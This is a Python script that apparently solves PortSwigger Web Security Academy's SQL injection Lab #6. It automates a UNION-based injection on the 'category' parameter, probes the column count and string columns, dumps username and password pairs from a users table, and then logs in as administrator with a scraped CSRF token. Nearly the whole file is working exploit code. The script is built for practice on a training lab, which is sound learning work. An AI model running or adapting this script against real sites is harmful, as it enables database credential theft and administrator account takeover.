#!/usr/bin/python3

from time import sleep
import re
import sys
import logging
import argparse
import urllib3
import urllib.parse
import urllib.request

from prettytable import PrettyTable
from colorama import Fore, Style
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format=Fore.BLUE + "[{asctime}] {message}",
    style="{",
    datefmt= Fore.BLUE + "%H:%M:%S",
)

def normalize_url(url):
    parsed_url = urllib.parse.urlparse(url)
    return f"{parsed_url.scheme}://{parsed_url.netloc}/"

def is_url_reachable(url):
    try:
        urllib.request.urlopen(url)
        return True
    except:
        return False
    
def check_if_already_been_solved(url) :
    response = requests.get(url, verify=False)
    if "Congratulations, you solved the lab!" in response.text:
        print("\n")
        log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.YELLOW + " The Lab has already been solved !!" + "\n" + Fore.WHITE)
        sys.exit(0)

def send_payload(url, uri, payload, no_proxy) :
    if no_proxy:
        r = requests.get(url + uri + payload, verify=False)
    else:
        r = requests.get(url + uri + payload, verify=False, proxies=PROXIES)

def check_response_code(url, uri, payload, no_proxy):
    if no_proxy:
        resp = requests.get(url + uri + payload)
    else:
        resp = requests.get(url + uri + payload, proxies=PROXIES, verify=False)
    
    return resp.status_code

def get_number_column(url, uri, no_proxy) : 
    columns = 1 
    while True:
        payload = "'+UNION+SELECT+" + "NULL,"*(columns-1) + "NULL--"
        log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
        send_payload(url, uri, payload, no_proxy)

        if check_response_code(url, uri, payload, no_proxy) == 500 :
            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]"  + Fore.RED + " Failed!!" + Fore.WHITE + " Incrementing the number of NULL values")
            columns +=1
            if (columns >= 10) : 
                log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " The number of columns exceed what's in the database !")
                sys.exit(-1)

        elif check_response_code(url, uri, payload, no_proxy) == 200 :
            return columns
        
        else :
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Something went wrong :(")
            sys.exit(-1)

def get_string_column(url, uri, number_columns, no_proxy) :
    columns_list = [0] * number_columns    

    for i in range(number_columns) :
        null_count = number_columns -i -1
        nulls = "NULL," * null_count
        payload = "'+UNION+SELECT+" + nulls + "'a'" + ",NULL" * i + "--"   # Payload to find columns that contains string data
        log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
        send_payload(url, uri, payload, no_proxy)
        if check_response_code(url, uri, payload, no_proxy) == 200 :
            columns_list[i] = 1

    return columns_list     # This is a list


def dump_data(url, uri, columns_string, no_proxy) :             # Payload: '+UNION+SELECT+username,password+FROM+users--    
    for i in range(len(columns_string)) :
        if (columns_string[i] == 1) :
            null_count = len(columns_string) -i -1
            nulls = "NULL," * null_count
            concat = "CONCAT(username, ':', password)"
            payload = "'+UNION+SELECT+" + nulls + concat + ",NULL" * i + "+FROM+users--"    # Payload to retrieve data from user's table 
            if (no_proxy) : 
                resp = requests.get(url + uri + payload, verify=False)
            else: 
                resp =requests.get(url + uri + payload, verify=False, proxies=PROXIES)

            pattern = r"<th>(.+?)</th>"
            credentials = re.findall(pattern, resp.text)
            break
        
        else: 
            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Something went wrong :(")
            sys.exit(-1)
    
    else: 
        log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to fetch the content of the table 'users' :(") 

    return credentials

def get_CSRF_token(session, url, uri, no_proxy) :
    if (no_proxy) :
        response = session.get(url+uri)
    else:
        response = session.get(url+uri, proxies=PROXIES, verify=False)

    pattern = re.compile(r'name="csrf" value="(.*?)"')
    Token = pattern.search(response.text)
    return Token[1]

def login(url, uri, csrf, session, password, no_proxy) :
    POST_data = {
        "csrf": csrf,
        "username": "administrator",
        "password": password,
    }
    if (no_proxy) :
        resp = session.post(url + uri, data=POST_data, verify=False)
    else:
        resp = session.post(url + uri, data=POST_data, verify=False, proxies=PROXIES)

def get_admin_password(credentials) :
    for i in range(len(credentials)) :
        if 'administrator' in credentials[i] :
            admin_index = i

    admin_creds = credentials[admin_index]
    my_list = admin_creds.split(':')

    return my_list[1]

def is_solved(url, s, no_proxy):
    def Get_Response(s, url, no_proxy):
        if no_proxy:
            resp = s.get(url)
        else:
            resp = s.get(url, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            return True
        
    solved = Get_Response(s, url, no_proxy)
    if solved:
        return True
    else:
        sleep(2)
        Get_Response(s, url, no_proxy)

if __name__ == "__main__":
    
    try: 
        parser = argparse.ArgumentParser(description="Usage Example: python3 SQLi-Lab#6.py --url https://0a2100.web-security-academy.net/ --no-proxy")
        parser.add_argument("-u", "--url", help="Enter the Lab URL", required=True)
        parser.add_argument("-n", "--no-proxy", help="Do not use proxy", default=False, action="store_true")
        args = parser.parse_args()

        url = normalize_url(args.url)
        uri = "filter?category="
        login_uri = "login"
        session = requests.Session()

        banner = Style.BRIGHT + Fore.BLUE + f"""
{'-'*135}
# Platform          : Web Security Academy Portswigger			
# Web Vulnerability : SQL Injection
# Type              : Server-side
{'-'*135}
{'-'*135}
# Lab #6            : SQL injection UNION attack, retrieving data from other tables
# Lab Level         : Practitioner
# Link              : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
{'-'*135}
        """
        print(banner)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Target URL: " + url)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing connection to the target URL")

        check_if_already_been_solved(url)

        if is_url_reachable(url):
            
            # Detecting the SQL injection vulnerability: 
            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing the GET parameter 'category'")
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " GET parameter " + Fore.GREEN + 'category' + Fore.WHITE + " is vulnerable to SQLi UNION attacks")
            sleep(1)
            print("\n")

            # Number of columns: 
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Finding the number of columns ...")
            number_columns = get_number_column(url, uri, args.no_proxy)
            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The " + Fore.GREEN + "number " + Fore.WHITE + "of columns returned by the query is: " + Style.BRIGHT + Fore.CYAN + str(number_columns))
            print("\n")

            # Columns with string data:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Searching for columns containing string data ...")
            columns_string = get_string_column(url, uri, number_columns, args.no_proxy)
            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Found " + Style.BRIGHT + Fore.CYAN + str(len(columns_string)) + " columns" + Fore.WHITE + " containing string data" )
            print("\n")

            # Dump data:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Dumping data from table "+ Fore.YELLOW + "users" + Fore.WHITE + " ...")
            credentials = dump_data(url, uri, columns_string, args.no_proxy)
            data = PrettyTable()
            data.field_names = ["username", "password"]

            # Printing the credentials
            result = []
            creds = []
            for element in credentials :
                result.append(element.split(':'))

            for element in result :
                for i in range (len(element)) :
                    creds.append(element[i])

            usernames =[]
            passwords=[]
            for i in range (len(creds)) :
                if (i%2 == 0) :
                    usernames.append(creds[i])
                else:
                    passwords.append(creds[i])

            for i in range(len(usernames)) :
                data.add_row([usernames[i], passwords[i]])
            print(data)
            print("\n")

            # Login as administrator:
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Logging in as administrator ... " )

            for i in range(len(usernames)) :
                if(usernames[i] == 'administrator') :
                    password_index = i

            csrf_token = get_CSRF_token(session, url, login_uri, args.no_proxy) 
            login(url, login_uri, csrf_token, session, passwords[password_index], args.no_proxy)

            if is_solved(url, session, args.no_proxy) :
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Logged in successfully as administrator")
                print("\n")
                sleep(1)
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " SQL injection exploited successfully :)")
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The Lab should now be solved. Congrats !")
                print("\n")

        else: 
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to connect to the target URL")
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " If the problem persists, please check that the provided target URL is reachable.")
            sys.exit(-1)

    except KeyboardInterrupt:
        print("\n")
        log.info(Fore.RED + "[-] The exploit has been INTERRUPTED !")

    except Exception as e:
        log.info(Fore.RED + "[-] " + str(e))
